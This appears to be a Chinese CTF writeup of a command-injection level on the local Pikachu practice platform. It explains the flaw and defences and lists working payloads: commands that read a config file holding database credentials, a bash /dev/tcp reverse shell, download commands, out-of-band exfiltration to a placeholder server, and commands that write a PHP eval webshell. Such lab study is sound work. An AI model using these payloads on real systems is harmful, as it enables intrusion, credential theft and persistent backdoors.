---
layout: post
title: Pikachu - RCE exec "ping" Writeup（命令注入与操作系统分隔符）
platform: pikachu
date: 2026-10-29 18:20:00 +0800
categories: CTF
---

Pikachu - RCE exec "ping" Writeup（命令注入与操作系统分隔符）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：RCE → exec "ping"
- 地址：`http://localhost/pikachu/vul/rce/rce_ping.php`
- 题型：Web
- 考点：**命令注入**、Windows/Linux 分隔符、执行权限

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
操作系统：Windows NT（php_uname('s') 实测）
数据库：pikachu / root / root
```

**页面形态**：

```text
Here, please enter the target IP address!

[ 文本框            ]  [ ping ]

<pre>
正在 Ping 127.0.0.1 具有 32 字节的数据:
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
...
</pre>
```

**作者提示**：

```html
data-content="想一下ping命令在系统上是怎么用的"
```

**✅ 实测结果（8 种 payload）**

| # | 输入 | 结果 |
|---|---|---|
| 1 | `127.0.0.1` | 正常 ping 输出（4 次回复 + 统计）|
| 2 | **`127.0.0.1 & whoami`** | ping 输出 + **`laptop-tevghr57\cecilia`** ✅ |
| 3 | **`127.0.0.1 \| whoami`** | **只有** `laptop-tevghr57\cecilia`（ping 输出被管道丢弃）|
| 4 | **`127.0.0.1 & echo RCE_MARKER`** | ping 输出 + **`RCE_MARKER`** ✅ |
| 5 | `127.0.0.1 & dir D:\` | ping 输出 + **D 盘目录列表** ✅ |
| 6 | **`127.0.0.1 & type D:\phpstudy_pro\WWW\pikachu\inc\config.inc.php`** | **数据库配置全文（含密码）** ✅ |
| 7 | `127.0.0.1 && echo AND_AND_OK` | ✅ 也可以（`&&` 也是 cmd 分隔符）|
| 8 | **`127.0.0.1 ; whoami`** | **`错误的参数 ;。`** ❌ **Linux 分隔符在 Windows 无效** |

**★ payload 6 读到的关键内容**：

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'root');          ← ★ 数据库密码直接暴露
define('DBNAME', 'pikachu');
define('DBPORT', '3306');
```

**★ payload 2 的意义**：

```
laptop-tevghr57\cecilia
└──────┬──────┘ └──┬──┘
   计算机名      用户名
   
★ 执行身份是【普通用户 cecilia】，不是 SYSTEM / Administrator
★ 因为 phpstudy 是 cecilia 启动的
```

二、题目分析

**① 漏洞代码：一行拼接**

```php
<?php
// rce_ping.php 第 21-29 行
if(isset($_POST['submit']) && $_POST['ipaddress'] != null){
    $ip = $_POST['ipaddress'];
//  $check=explode('.', $ip); 可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
//      var_dump(php_uname('s'));
        $result .= shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result .= shell_exec('ping -c 4 '.$ip);
    }
}
?>
```

**★ 第 66 行把结果原样输出**：

```php
if($result){
    echo "<pre>{$result}</pre>";
}
```

**★ 三个关键点**：

```
① $ip 直接拼进 shell 命令，零过滤
② shell_exec() 会把字符串交给 shell（Windows 是 cmd.exe）执行
③ 结果用 <pre> 原样回显 → ★ 有回显，最好利用
```

**★ 作者的注释里已经写出了正确做法（被注释掉了）**：

```php
// $check = explode('.', $ip);  先拆分，然后校验数字以范围
// 第一位和第四位 1-255，中间两位 0-255
```

**② 漏洞原理：用户输入变成了"命令的一部分"**

**正常使用**：

```php
shell_exec('ping 127.0.0.1')
       ↓
cmd.exe /c "ping 127.0.0.1"
```

**注入使用**：

```php
$_POST['ipaddress'] = '127.0.0.1 & whoami'
shell_exec('ping 127.0.0.1 & whoami')
       ↓
cmd.exe /c "ping 127.0.0.1 & whoami"
                        └──┬──┘
                   cmd 看到 & → 执行第二条命令
       ↓
输出 = ping 的结果 + whoami 的结果
```

**★ 一句话**：

```
shell_exec 把"字符串"交给"命令解释器"
命令解释器不认识"参数"和"命令"的区别
→ 只要字符串里有分隔符，就变成了"多条命令"
```

**③ ⭐ 核心知识点：分隔符是"操作系统的"，不是 PHP 的**

**★ 这是本关最容易踩的坑**。

**Windows `cmd.exe` 的分隔符**：

| 符号 | 含义 | 例子 |
|---|---|---|
| `&` | **顺序执行**（不管前面成败）| `ping 1.1.1.1 & whoami` |
| `&&` | **前面成功才执行** | `ping 1.1.1.1 && whoami` |
| `\|\|` | **前面失败才执行** | `ping 999.1.1.1 \|\| whoami` |
| `\|` | **管道**（前者输出给后者）| `ping 1.1.1.1 \| whoami` |

**Linux `bash` 的分隔符**：

| 符号 | 含义 |
|---|---|
| `;` | 顺序执行 |
| `&` | 后台执行 |
| `&&` / `\|\|` | 条件执行 |
| `\|` | 管道 |
| `` `cmd` `` / `$(cmd)` | 命令替换 |

**★ 实测对比（本机 Windows）**：

```
127.0.0.1 & whoami      → ✅ 执行了（cmd 的 &）
127.0.0.1 && echo ok    → ✅ 也可以
127.0.0.1 ; whoami      → ❌ 错误的参数 ;。
                            └────┬────┘
                      ★ Windows cmd 不认识 ;
                      ★ 这是 Linux 的分隔符
```

**★ 所以打 RCE 的第一件事：判断目标是什么系统。**

**判断方法**：

```
① 看 ping 的输出
   中文"来自...的回复" → 中文 Windows
   "64 bytes from"      → Linux
   
② 用 & 试 → 成功 = Windows
③ 用 ; 试 → 成功 = Linux
④ 用 dir 试 → 成功 = Windows（Linux 是 ls）
⑤ 用 ls  试 → 成功 = Linux
```

**④ 一个附带的坑：输出乱码（GBK vs UTF-8）**

**★ 第一次访问就看到满屏 ``**：

```
��� Ping 127.0.0.1 ��� 32 ���...：
��� 127.0.0.1 ���=32 ���：��<1ms TTL=128
```

**★ 原因**：

```
① ping 在中文 Windows 下输出 GBK 编码
② 页面 header 声明 UTF-8（config.inc.php 里 header('Content-type:text/html;charset=utf-8')）
③ 浏览器按 UTF-8 解释 GBK 字节 → 无法解码的字节变成 �（U+FFFD）
```

**★ 验证：ASCII 部分完全正常**：

```
127.0.0.1   → 正常
32          → 正常
<1ms TTL=128 → 正常
=4          → 正常
```

**★ 只有中文字符乱。**

**★ 这对做题的影响**：

```
不影响注入判断，但影响读输出

★ 解决办法：用"输出是英文"的命令
    whoami / dir / ipconfig / type / echo / net user
★ 这些命令的输出全是 ASCII → 一目了然
```

**★ 如果非要看中文**：

```
127.0.0.1 & chcp 65001 >nul & echo 测试中文
```

**★ 但注意**：

```
chcp 只对"它之后的命令"生效
前面的 ping 输出仍是 GBK → 还是乱

★ 所以最实用的办法是"用英文命令"
```

**⑤ 权限的意义：为什么是 cecilia 而不是 SYSTEM**

**★ 实测 `whoami`**：

```
laptop-tevghr57\cecilia
```

**★ 这是关键信息**：

```
Web 服务器的权限 = 启动它的用户权限

· 本机 phpstudy 是 cecilia 手动启动的
  → Apache 进程以 cecilia 身份运行
  → PHP 的 shell_exec 也是 cecilia 身份
  → 所以 RCE 拿到的是 cecilia

· 如果是 IIS / 服务方式启动
  → 可能是 IIS_IUSRS / SYSTEM / NetworkService
```

**★ 权限决定了"能做什么"**：

| 身份 | 能做的事 |
|---|---|
| **SYSTEM / root** | 读任意文件、改注册表、装服务、提权 |
| **Administrator** | 几乎同上 |
| **普通用户（本例）** | 读写自己的文件、连本机数据库、写网站目录 |
| **受限用户（IIS_IUSRS）** | 只能读网站目录，几乎什么都干不了 |

**★ 本环境（cecilia）的实际能力**：

```
✅ 读 C:\Users\cecilia\ 下所有文件
✅ 读/写 D:\phpstudy_pro\WWW\（网站目录）
✅ 连本机 MySQL（配置里有密码）
✅ 执行所有用户级命令（whoami / ipconfig / net user / tasklist）
❌ 不能改系统设置、不能装服务、不能读 SAM
```

**★ 但"能写网站目录"就已经够了** —— 可以写 webshell（见下面延伸知识）。

三、解题步骤

**第 1 步：正常 ping（建立基准）**

```text
① 打开 http://localhost/pikachu/vul/rce/rce_ping.php
② 输入框填：127.0.0.1
③ 点 ping
④ 看到 ping 的输出（中文会乱码，但结构清楚）
```

**★ 从输出能看出是 Windows**（"数据包: 已发送 = 4"这种中文格式）。

**第 2 步：⭐ 试 `&`（确认 Windows）**

**输入**：

```
127.0.0.1 & whoami
```

**结果**：

```
...ping 输出（乱码的中文）...
laptop-tevghr57\cecilia          ← ★ 多出来的一行
```

**★ 一行 ASCII 输出，清楚看到用户名。**

**★ 到这里注入已经成功了。**

**第 3 步：⭐ 确认 Linux 分隔符不可用（对比实验）**

**输入**：

```
127.0.0.1 ; whoami
```

**结果**：

```
错误的参数 ;。
```

**★ 拼出来的命令**：

```
cmd.exe /c "ping 127.0.0.1 ; whoami"
                          └─┬─┘
                    cmd 把 ; 当成 ping 的一个参数
                    ping 不认识 → 报错
```

**★ 这个对比非常重要**：

```
& → 成功（Windows 分隔符）
; → 失败（Linux 分隔符）

★ 证明了"分隔符取决于操作系统"
```

**第 4 步：⭐ 读配置文件（信息泄露）**

**输入**：

```
127.0.0.1 & type D:\phpstudy_pro\WWW\pikachu\inc\config.inc.php
```

**结果**（往下翻，中文乱码但英文清楚）：

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'root');          ← ★ 数据库密码
define('DBNAME', 'pikachu');
define('DBPORT', '3306');
```

**★ 这一步的意义**：

```
RCE → 读配置文件 → 拿到数据库密码 → 接管数据库

★ 这就是"漏洞链"：一个 RCE 就能串起整个系统
★ 而且这个文件是"应用自己的配置"，不是系统文件
★ 但它包含了"最敏感的信息"（数据库凭证）
```

**第 5 步：列网站目录**

**输入**：

```
127.0.0.1 & dir D:\phpstudy_pro\WWW\pikachu
```

**结果**：

```
...ping 输出...
 驱动器 D 中的卷是 Data
 卷的序列号是 C0B5-36B6

 D:\phpstudy_pro\WWW\pikachu 的目录

2023/xx/xx  xx:xx    <DIR>          .
2023/xx/xx  xx:xx    <DIR>          ..
2023/xx/xx  xx:xx             1,234 index.php
2023/xx/xx  xx:xx    <DIR>          vul
2023/xx/xx  xx:xx    <DIR>          inc
2023/xx/xx  xx:xx    <DIR>          assets
...
```

**★ 能看到整个网站结构 —— 这就是"情报收集"。**

**第 6 步：看一眼网络信息（可选）**

```
127.0.0.1 & ipconfig | findstr IPv4
```

**结果**：

```
   IPv4 地址 . . . . . . . . . . . . : 10.40.116.87
```

**★ 注意这里用了 `|`（管道）**：

```
ipconfig 的输出 → 交给 findstr → 只显示含 IPv4 的行
★ 管道也是命令注入的一部分
```

**第 7 步：完整 payload 汇总**

```
// Windows 环境

127.0.0.1 & whoami
127.0.0.1 & echo RCE_MARKER
127.0.0.1 & dir D:\
127.0.0.1 & type D:\phpstudy_pro\WWW\pikachu\inc\config.inc.php
127.0.0.1 & ipconfig
127.0.0.1 & net user
127.0.0.1 & tasklist
127.0.0.1 | whoami                          （只要 whoami 的输出）
127.0.0.1 && whoami                         （前者成功才执行）
ping 999.999.999.999 || whoami              （前者失败才执行）

// Linux 环境（本关不适用，供参考）

127.0.0.1 ; whoami
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

四、延伸知识

**① 命令注入的完整 payload 清单**

**分隔符类**：

```bash
# Windows
&   whoami
&&  whoami
||  whoami
|   whoami
%0a whoami          # 换行（有时可用）

# Linux
;   whoami
|   whoami
||  whoami
&&  whoami
`whoami`
$(whoami)
%0a whoami
```

**常见"能执行什么"**：

| 目的 | Windows | Linux |
|---|---|---|
| 当前用户 | `whoami` | `whoami` / `id` |
| 主机信息 | `systeminfo` | `uname -a` |
| 网络配置 | `ipconfig` | `ifconfig` / `ip a` |
| 进程列表 | `tasklist` | `ps aux` |
| 用户列表 | `net user` | `cat /etc/passwd` |
| 列目录 | `dir` | `ls -la` |
| 读文件 | `type 文件` | `cat 文件` |
| 找文件 | `dir /s /b 文件名` | `find / -name 文件名` |
| 下载文件 | `certutil -urlcache -f URL 文件` | `wget URL` / `curl URL -o 文件` |
| 反弹 shell | `powershell -c ...` | `bash -i >& /dev/tcp/IP/PORT 0>&1` |

**② 无回显的 RCE 怎么判断**

**★ 本关有回显（`<pre>` 输出），算"最好的情况"。**

**★ 如果页面不回显输出，有三种判断方法**：

**方法 1：时间盲注（同 SQL 注入思路）**

```bash
# Windows
127.0.0.1 & ping -n 5 127.0.0.1        # 延时约 5 秒
127.0.0.1 & timeout /t 5               # 延时 5 秒

# Linux
127.0.0.1 ; sleep 5
```

**★ 看响应时间是否变长。**

**方法 2：写文件（然后访问）**

```bash
127.0.0.1 & echo test > D:\phpstudy_pro\WWW\probe.txt
```

**★ 然后访问 `http://target/probe.txt` 看文件在不在。**

**方法 3：带外（DNS / HTTP）**

```bash
# Windows（需要 powershell）
127.0.0.1 & powershell -c "Invoke-WebRequest http://你的服务器/$(whoami)"

# Linux
127.0.0.1 ; curl http://你的服务器/$(whoami)
127.0.0.1 ; ping -c 1 $(whoami).你的域名
```

**★ 用 DNSLog / Burp Collaborator / ntfy.sh 这类服务收数据。**

**③ RCE → getshell 的完整链**

**★ 前提**：网站目录可写（本关成立）。

**★ 步骤**：

**Step 1：确认目录可写**

```bash
127.0.0.1 & echo test > D:\phpstudy_pro\WWW\pikachu\test.txt
```

**Step 2：写 webshell**

```bash
127.0.0.1 & echo ^<?php @eval($_POST[1]);?^> > D:\phpstudy_pro\WWW\pikachu\shell.php
```

**★ 注意 `^` 是 cmd 的转义符**：

```
cmd 里 < > | & 都有特殊含义
必须用 ^ 转义，否则会被 cmd 自己解释

<?php ... ?> 里的 < > 必须写成 ^< ^>
```

**Step 3：用菜刀 / 蚁剑 / 一句话木马连接**

```
POST http://target/pikachu/shell.php
Body: 1=phpinfo();
```

**★ 或者更"干净"的写法（避免转义麻烦）**：

```bash
127.0.0.1 & powershell -c "Set-Content -Path 'D:\phpstudy_pro\WWW\pikachu\shell.php' -Value '<?php @eval($_POST[1]);?>'"
```

**★ 但这一步"真的会生成后门文件"**：

```
· 在做靶场练习时，验证到"能读文件"就够了
· 不必真的写 webshell（避免误伤真实的开发环境）
· 而且写完后要记得删除
```

**④ 防御（三层）**

**❌ 本关的反面教材**：

```php
$ip = $_POST['ipaddress'];
$result = shell_exec('ping '.$ip);      // 直接拼接
```

**✅ 正确做法 1：白名单校验（最稳）**

```php
$ip = $_POST['ipaddress'];

// 只允许 IPv4 格式
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("请输入合法的 IPv4 地址");
}

$result = shell_exec('ping -n 4 ' . escapeshellarg($ip));
```

**★ 这一步直接掐死注入**：

```
"127.0.0.1 & whoami" → filter_var 返回 false → 直接拒绝
```

**✅ 正确做法 2：`escapeshellarg()`（参数转义）**

```php
$ip = escapeshellarg($_POST['ipaddress']);
// "127.0.0.1 & whoami" → "'127.0.0.1 & whoami'"
// ★ & 被包在引号里 → cmd 当成普通参数 → 不执行
$result = shell_exec('ping ' . $ip);
```

**★ 但 `escapeshellarg` 在不同系统上行为不同**：

```
· Windows 下它用双引号包裹
· 双引号内的 & | 不会被执行
· 但如果输入里含双引号，可能还有问题
★ 所以"白名单"比"转义"更安全
```

**✅ 正确做法 3：不用 shell（用内置函数）**

```php
// 用 PHP 内置的"执行程序"函数，不经过 cmd
$result = shell_exec('ping -n 4 ' . $ip);
// × 还是经过 cmd

// ✅ 更好的方式：用 proc_open 加数组参数（PHP 7.4+）
$process = proc_open(['ping', '-n', '4', $ip], [...], $pipes);
// ★ 数组形式不经过 shell → 没有注入
```

**★ 关键原则**：

```
"能用参数数组，就不要拼字符串"
"能白名单，就不要靠转义"
```

**✅ 正确做法 4：限制命令执行权限**

```php
// php.ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,proc_popen

// 或者用 open_basedir 限制文件访问
open_basedir = D:/phpstudy_pro/WWW/
```

**★ 这一招能"抬高门槛"**：

```
即使有命令注入，shell_exec 被禁用 → 打不了
★ 但攻击者可能有别的函数（反引号、popen、pcntl_exec）
★ 所以这是"纵深防御"的一层，不是唯一手段
```

**⑤ 真实世界的 RCE 案例**

**案例 1：ping / traceroute 功能（本关同款）**

```
· 网络设备管理后台的"连通性测试"
· 运维平台的"服务器检测"
★ 这是命令注入的重灾区
```

**案例 2：图片处理（ImageMagick）**

```
ImageMagick 的 "ImageTragick"（CVE-2016-3714）
用户上传的文件名里含 `|` → 变成命令
★ 影响大量网站
```

**案例 3：备份 / 导出功能**

```php
exec("tar -czf backup.tar.gz {$user_dir}");
// 如果 $user_dir 含 ; 或 $() → 命令注入
```

**案例 4：日志分析**

```php
$result = shell_exec("grep '{$keyword}' /var/log/access.log");
// keyword 里可以注入
```

**★ 共同点**：

```
① 功能是"调用系统命令"
② 参数来自用户输入
③ 没做白名单校验
```

**⑥ 与 SQL 注入、XSS 的对比**

| | SQL 注入 | XSS | **RCE** |
|---|---|---|---|
| 注入对象 | SQL 语句 | HTML/JS | **shell 命令** |
| 执行环境 | 数据库 | 浏览器 | **操作系统** |
| 危害层级 | 数据泄露/篡改 | 用户会话 | **服务器沦陷** |
| 典型危害 | 拖库 | 偷 cookie | **读文件 / getshell / 内网渗透** |

**★ 一句话**：

```
SQL 注入 = 攻数据库
XSS     = 攻浏览器
RCE     = 攻操作系统  ← 最严重
```

**★ 现实中 RCE 通常被定为"高危/严重"漏洞**（CVSS 常在 9.0 以上）。

五、总结

- **本题核心：`shell_exec('ping '.$ip)` 直接拼接 → 用户输入里的命令分隔符让"一个命令"变成"多个命令"。**

- **一行漏洞代码 + 一行回显**：

```php
$result .= shell_exec('ping '.$ip);      // ★ 零过滤拼接
...
echo "<pre>{$result}</pre>";             // ★ 结果原样回显（有回显 RCE）
```

- **⭐ 八个必记要点**：

```text
① 分隔符是"操作系统的"，不是 PHP 的
   Windows: & && || |
   Linux:   ; & && || ` `` ` $()
   ★ 实测：; 在 Windows 上报"错误的参数 ;"

② 先判断系统
   看 ping 输出格式 / 试 & / 试 ; / 试 dir 和 ls

③ 有回显的 RCE 最好利用
   本关用 <pre> 原样输出 → 命令结果直接看

④ 乱码不影响注入
   Windows cmd 输出 GBK，页面是 UTF-8 → 中文乱码
   ★ 用 whoami / dir / type 这类英文输出的命令

⑤ 权限决定危害
   whoami = laptop-tevghr57\cecilia（普通用户，不是 SYSTEM）
   ★ 但能写网站目录 → 能 getshell
   
⑥ 读配置文件是"高价值目标"
   & type config.inc.php → 拿到数据库密码
   ★ RCE + 信息泄露 = 完整攻击链

⑦ RCE → getshell 需要 cmd 转义
   echo ^<?php @eval($_POST[1]);?^> > shell.php
   ★ ^ 是 cmd 的转义符

⑧ 防御优先级
   白名单（filter_var）> escapeshellarg > 禁用危险函数
   ★ 能用参数数组就不拼字符串
```

- **实测数据**：

```text
127.0.0.1                                       → 正常 ping
127.0.0.1 & whoami                              → laptop-tevghr57\cecilia
127.0.0.1 | whoami                              → 只有 cecilia（管道丢掉了 ping 输出）
127.0.0.1 & echo RCE_MARKER                     → RCE_MARKER
127.0.0.1 & dir D:\                             → D 盘目录
127.0.0.1 && echo AND_AND_OK                    → 成功
127.0.0.1 ; whoami                              → 错误的参数 ;。  ★ Linux 分隔符失败

127.0.0.1 & type ...\inc\config.inc.php         → DBPW: root（数据库密码泄露）
127.0.0.1 & ipconfig | findstr IPv4             → 10.40.116.87
```

- **RCE 模块进度**：

```text
✅ exec "ping"      —— 本题：命令注入 + 分隔符
⬜ exec "eval"      —— 代码执行（eval 注入）
```

**手工复现要点**：

```text
· 输入 127.0.0.1 → 看正常 ping（中文乱码，但结构清楚）
· 输入 127.0.0.1 & whoami → 底部出现 laptop-tevghr57\cecilia
· 输入 127.0.0.1 ; whoami → "错误的参数 ;"（对比实验）
· 输入 127.0.0.1 & type D:\phpstudy_pro\WWW\pikachu\inc\config.inc.php
  → 看到 DBPW: root
· 输入 127.0.0.1 & dir D:\phpstudy_pro\WWW\pikachu → 看目录结构
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  命令注入 = "参数"变成了"命令"                                 │
│                                                            │
│  shell_exec('ping ' . $ip)                                 │
│  $ip = "127.0.0.1 & whoami"                                │
│      → ping 127.0.0.1 & whoami                             │
│      → cmd 看到 & → 执行第二条                              │
│                                                            │
│  分隔符看系统：                                               │
│      Windows: & && || |                                    │
│      Linux:   ; & && || ` `` ` $()                          │
│                                                            │
│  ★ 先判断系统，再决定用什么符号                                 │
│  ★ 权限看 whoami（决定能干什么）                               │
│  ★ 读配置文件是最有价值的下一步                                 │
│  ★ 防御：白名单 > escapeshellarg > 禁用函数                    │
└────────────────────────────────────────────────────────────┘
```
